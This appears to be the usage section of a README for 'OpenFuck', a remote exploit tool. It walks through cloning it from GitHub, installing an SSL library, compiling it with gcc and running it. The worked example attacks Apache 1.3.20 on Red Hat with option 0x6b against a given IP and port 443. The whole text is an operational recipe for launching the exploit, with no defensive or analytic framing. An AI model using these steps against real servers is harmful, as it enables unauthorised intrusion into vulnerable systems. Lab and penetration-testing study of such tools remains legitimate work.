

## Usage


1. Download OpenFuck.c
```
git clone https://github.com/heltonWernik/OpenFuck.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

````
gcc -o OpenFuck OpenFuck.c -lcrypto
````

4. Running the Exploit
```
./OpenFuck
```

5. See which service you wish to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6b option
./OpenFuck 0x6b [Target Ip] [port] -c 40

for example:
```
./OpenFuck 0x6b 192.168.0.23 443 -c 40
```



